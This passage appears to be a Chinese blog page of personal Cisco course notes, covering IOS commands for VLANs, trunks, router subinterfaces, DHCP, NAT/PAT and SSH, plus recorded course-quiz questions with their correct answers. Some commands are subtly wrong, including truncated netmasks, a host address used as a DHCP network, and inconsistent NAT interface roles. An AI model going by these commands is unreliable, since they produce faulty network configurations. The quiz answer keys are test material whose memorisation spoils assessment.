class="hljs-params">(config)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Sales<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">20</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Production<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Marketing<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">40</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> HR<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span>#ex<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> rang<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> range f0/<span class="hljs-number">5</span>-<span class="hljs-number">9</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> m ac<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> ac vlan <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#int</span> range f0/<span class="hljs-number">10</span>-<span class="hljs-number">14</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> m ac<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> ac vlan <span class="hljs-number">20</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#int</span> range f0/<span class="hljs-number">15</span>-<span class="hljs-number">19</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> m ac<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> ac vlan <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#int</span> range f0/<span class="hljs-number">20</span>-<span class="hljs-number">24</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> m ac<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> ac vlan <span class="hljs-number">40</span><br><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> m trunk <br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">2</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> m trunk <br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> m trunk<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">4</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> m trunk<br><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0.10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.31</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.224</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0.20</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">20</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.31</span>.<span class="hljs-number">20.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.240</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0.30</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.31</span>.<span class="hljs-number">30.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.128</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0.40</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">40</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.31</span>.<span class="hljs-number">40.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.192</span><br><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> dhcp pool VLAN_10<br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-selector-id">#dns-server</span> <span class="hljs-number">209.165</span>.<span class="hljs-number">201.14</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-number">#def</span>ault-router <span class="hljs-number">172.31</span>.<span class="hljs-number">10.1</span> <br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-selector-id">#network</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">10.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.224</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> dhcp pool VLAN_20<br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-selector-id">#dns-server</span> <span class="hljs-number">209.165</span>.<span class="hljs-number">201.14</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-selector-id">#network</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">20.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.240</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-number">#def</span>ault-router <span class="hljs-number">172.31</span>.<span class="hljs-number">20.1</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> dhcp pool VLAN_30<br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-selector-id">#network</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">30.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.128</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-selector-id">#dns-server</span> <span class="hljs-number">209.165</span>.<span class="hljs-number">201.14</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-number">#def</span>ault-router <span class="hljs-number">172.31</span>.<span class="hljs-number">30.1</span><br><br><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> dhcp excluded-<span class="hljs-selector-tag">address</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">10.10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> dhcp excluded-<span class="hljs-selector-tag">address</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">20.1</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">20.10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> dhcp excluded-<span class="hljs-selector-tag">address</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">30.1</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">30.10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> dhcp excluded-<span class="hljs-selector-tag">address</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">40.1</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">40.10</span><br></code></pre></td></tr></table></figure><h2 id="第九章"><a href="#第九章" class="headerlink" title="第九章"></a>第九章</h2><h3 id="9-1-2-1-静态nat"><a href="#9-1-2-1-静态nat" class="headerlink" title="9.1.2.1 静态nat"></a>9.1.2.1 静态nat</h3><p>NAT 转换有三种类型：</p><ul><li><p><strong>静态地址转换（静态 NAT）</strong>- 本地地址和全局地址之间的一对一地址映射。</p></li><li><p><strong>动态地址转换（动态 NAT）</strong>- 本地地址和全局地址之间的多对多地址映射。转换在可用的基础上进行：例如，如果有 100 个内部本地地址和 10 个内部全局地址，则任何时候都只能转换 100 个内部本地地址中的 10 个地址。动态 NAT 的这种限制使得它在用于生产网络时没有端口地址转换那么实用。</p></li><li><p><strong>端口地址转换 (PAT)</strong> - 本地地址和全局地址之间的多对一地址映射。此方法也称为过载（NAT 过载）。例如，如果有 100 个内部本地地址以及 10 个内部全局地址，PAT 使用端口作为附加参数来提供乘数效应，从而支持重复使用 10 个内部全局地址中的任何一个地址，重复次数高达 65,536 次（这取决于通信流是基于 UDP、TCP 还是 ICMP）。</p><p>  <strong>show ip nat translations</strong>。</p></li></ul><h3 id="9-2-1-4"><a href="#9-2-1-4" class="headerlink" title="9.2.1.4"></a>9.2.1.4</h3><p>Ip nat inside static <em>Inside_local_IP_address</em> <em>Inside_global_IP_address</em></p><p>Ip nat inside static <em>Outside_global_IP_address</em> <em>Outside_local_IP_address</em></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> nat inside source static <span class="hljs-number">172.16</span>.<span class="hljs-number">16.1</span> <span class="hljs-number">64.100</span>.<span class="hljs-number">50.1</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> nat outside source static <span class="hljs-number">64.100</span>.<span class="hljs-number">50.1</span> <span class="hljs-number">209.165</span>.<span class="hljs-number">128.130</span><br>(config)<span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#ip</span> nat inside <br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> s0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#ip</span> nat outside <br></code></pre></td></tr></table></figure><h3 id="9-2-2-2-配置动态nat"><a href="#9-2-2-2-配置动态nat" class="headerlink" title="9.2.2.2 配置动态nat"></a>9.2.2.2 配置动态nat</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200527220001298.png" class="" title="image-20200527220001298"><h3 id="9-2-2-5"><a href="#9-2-2-5" class="headerlink" title="9.2.2.5"></a>9.2.2.5</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span>#access-<span class="hljs-built_in">list</span> <span class="hljs-number">1</span> permit <span class="hljs-number">172.16</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">255.255</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span>#ip nat pool DYNAMIC <span class="hljs-number">209.165</span>.<span class="hljs-number">76.196</span> <span class="hljs-number">209.165</span>.<span class="hljs-number">76.199</span> netmask <span class="hljs-number">255.255</span>.<span class="hljs-number">255.</span><br><span class="hljs-comment">// Associate ACL1 with the NAT pool.</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span>#ip nat inside source <span class="hljs-built_in">list</span> <span class="hljs-number">1</span> pool DYNAMIC<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># interface s0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat outside<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># interface s0/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat inside<br></code></pre></td></tr></table></figure><h3 id="9-2-3-1-配置PAT：地址池"><a href="#9-2-3-1-配置PAT：地址池" class="headerlink" title="9.2.3.1 配置PAT：地址池"></a>9.2.3.1 配置PAT：地址池</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200527231311081.png" class="" title="image-20200527231311081"><p><strong>overload</strong> 关键字会启用 PAT。</p><h3 id="9-2-3-6"><a href="#9-2-3-6" class="headerlink" title="9.2.3.6"></a>9.2.3.6</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># ip access-<span class="hljs-built_in">list</span> standard R2NAT<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">std</span>-<span class="hljs-params">nacl</span>)</span># permit <span class="hljs-number">192.168</span>.<span class="hljs-number">10.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.255</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">std</span>-<span class="hljs-params">nacl</span>)</span># permit <span class="hljs-number">192.168</span>.<span class="hljs-number">20.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.255</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">std</span>-<span class="hljs-params">nacl</span>)</span># permit <span class="hljs-number">192.168</span>.<span class="hljs-number">30.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.255</span><br><br><span class="hljs-comment">//使用名为 R2POOL 的 NAT 池配置 R2，该 NAT 池使用 209.165.202.128/30 地址空间中的第一个地址。</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># ip nat pool R2POOL <span class="hljs-number">209.165</span>.<span class="hljs-number">202.129</span> <span class="hljs-number">209.165</span>.<span class="hljs-number">202.129</span> netmask <span class="hljs-number">255.255</span>.<span class="hljs-number">255.</span><br><span class="hljs-comment">//将命名 ACL 与 NAT 池相关联，并启用 PAT。</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># ip nat inside source <span class="hljs-built_in">list</span> R2NAT pool R2POOL overload<br><br><span class="hljs-comment">//使用相应的内部和外部 NAT 命令配置 R2 接口。</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># inte fa0/<span class="hljs-number">0</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat inside<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># inte s0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat inside<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># inte s0/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat inside<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># inte s0/<span class="hljs-number">1</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat outside<br><br><span class="hljs-comment">//请参考拓扑结构。 创建静态 NAT 转换，以将 local.pka 内部地址映射至其外部地址</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># ip nat inside source static <span class="hljs-number">192.168</span>.<span class="hljs-number">20.254</span> <span class="hljs-number">209.165</span>.<span class="hljs-number">202.130</span><br></code></pre></td></tr></table></figure><h3 id="9-3-1-4"><a href="#9-3-1-4" class="headerlink" title="9.3.1.4"></a>9.3.1.4</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//Correct the Interfaces.</span><br><span class="hljs-comment">//Assign the ip nat inside and ip nat outside commands to the correct ports.</span><br><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># interface Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat outside<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># interface Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat inside<br><br><span class="hljs-comment">//Correct the Access-list.</span><br><span class="hljs-comment">//Delete access-list 101 and replace it with a similar list that is also one statement in length. The only difference should be the wildcard.</span><br><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># no access-<span class="hljs-built_in">list</span> <span class="hljs-number">101</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># access-<span class="hljs-built_in">list</span> <span class="hljs-number">101</span> permit ip <span class="hljs-number">10.4</span>.<span class="hljs-number">10.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">1.255</span> any<br></code></pre></td></tr></table></figure><h3 id="9-4-1-2"><a href="#9-4-1-2" class="headerlink" title="9.4.1.2"></a>9.4.1.2</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Switch</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#host</span> HQ-SW<br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> domain-name cisco.com<br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#crypto</span> key generate rsa<br>How many bits <span class="hljs-keyword">in</span> the modulus <span class="hljs-selector-attr">[512]</span>: <span class="hljs-number">1024</span><br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#username</span> HQadmin password ciscoclass<br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> ssh version <span class="hljs-number">2</span><br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> ssh authentication-retries <span class="hljs-number">2</span><br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> ssh time-out <br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#line</span> vty <span class="hljs-number">0</span> <span class="hljs-number">15</span><br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config-line)</span></span><span class="hljs-selector-id">#login</span> local<br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config-line)</span></span><span class="hljs-selector-id">#transport</span> <span class="hljs-selector-tag">input</span> ssh<br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#service</span> password-encryption <br></code></pre></td></tr></table></figure><h2 id="考题记录"><a href="#考题记录" class="headerlink" title="考题记录"></a>考题记录</h2><blockquote><p>ospf管理距离为110</p></blockquote><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303201755734.png" class="" title="image-20200303201755734"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303202527458.png" class="" title="image-20200303202527458"><p>DNS 53端口 即是UDP也是TCP</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200326091219029.png" class="" title="image-20200326091219029"><blockquote><p>What happens to a static route entry in a routing table when the outgoing interface is not available?<br><strong>The route is removed from the table.</strong></p></blockquote><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200409112857408.png" class="" title="image-20200409112857408"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415131256177.png" class="" title="image-20200415131256177"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415131821432.png" class="" title="image-20200415131821432"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415131935464.png" class="" title="image-20200415131935464"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415132300377.png" class="" title="image-20200415132300377"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415132637432.png" class="" title="image-20200415132637432"><p>匹配最长</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415132753057.png" class="" title="image-20200415132753057"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415132849136.png" class="" title="image-20200415132849136"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415132945261.png" class="" title="image-20200415132945261"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415133009739.png" class="" title="image-20200415133009739"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415133124039.png" class="" title="image-20200415133124039"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415133146490.png" class="" title="image-20200415133146490"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415133211622.png" class="" title="image-20200415133211622"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415133305998.png" class="" title="image-20200415133305998"><blockquote><p>模块化交换机通过使用线路卡提供了容错和带宽可用性与将来扩展的功能，但实施成本非常昂贵。堆叠式交换机通过在交换机之间使用特殊电缆提供容错和带宽可用性，并且比模块化交换机的实施成本低。非堆叠式交换机不提供这些功能。固定配置交换机是不支持自带功能以外功能的单个交换机。</p></blockquote><p>交换机分层设计模型有哪三层？</p><blockquote><p>接入层是最低层，它为用户提供网络访问。分布层具有很多功能，但是它聚合接入层的数据，提供过滤、策略控制并设置第 3 层路由边界。核心层提供高速连接。</p></blockquote><blockquote><p>为提高效率、可扩展性和成本效益，建议建立从一个中心站点到所有其他园区站点的扩展星型拓扑。网状拓扑更昂贵，总线和双环拓扑更难进行故障排除和维护。</p></blockquote><p>网络设计师何时会关注 RU？</p><p>何时考虑端口密度<br>何时计算最大端口速度<br>何时确定可用的线卡数量<br>何时购买用于网络机架的特定数量的交换机</p><blockquote><p>机架单元或 RU 是与交换机高度相关的一项特定测量。1 RU 交换机的额定值小于 2 RU 交换机的额定值。端口密度测量交换机上的端口数。模块化影响可用线卡的数量。端口速度测量可流过给定端口的每秒比特数。</p><p>正确答案是：何时购买用于网络机架的特定数量的交换机</p></blockquote><p>融合网络中的自动话务员功能提供什么服务？</p><p>点对点视频<br>呼叫路由<br>IT 管理接口<br>视频会议</p><blockquote><p>自动话务员功能通过将呼叫直接路由到个人或部门，从而加快语音服务的速度。点对点视频和视频会议说明了融合网络中的视频服务。IT 管理接口是融合网络解决方案的一部分，能够让 IT 人员通过统一应用执行移动、添加和更改等操作。</p></blockquote><p>正确答案是：呼叫路由</p><p>哪两个特征描述了融合网络？（请选择两项。）</p><p>降低了服务呼叫<br>使用相同的交换机支持语音和视频<br>语音和视频流量的单独布线基础设施<br>中小型企业的可负担性<br>更低的设备成本</p><blockquote><p>融合网络具有传统的用户流量以及数字化语音和视频流量，这些流量以前需要单独的网络。现在，不再是单独的组管理单独的网络，一组人员即可管理网络。</p></blockquote><p>正确答案是：使用相同的交换机支持语音和视频, 中小型企业的可负担性</p><h3 id="What-type-of-network-uses-one-common-infrastructure-to-carry-voice-data-and-video-signals"><a href="#What-type-of-network-uses-one-common-infrastructure-to-carry-voice-data-and-video-signals" class="headerlink" title="What type of network uses one common infrastructure to carry voice, data, and video signals?"></a>What type of network uses one common infrastructure to carry voice, data, and video signals?</h3><ul><li><p>switched</p></li><li><p>borderless</p></li><li><p>converged</p></li><li><p>managed</p><blockquote><p><strong>Explanation:</strong>A converged network has only one physical network to install and manage. This results in substantial savings over the installation and management of separate voice, video, and data networks.</p></blockquote></li></ul><h3 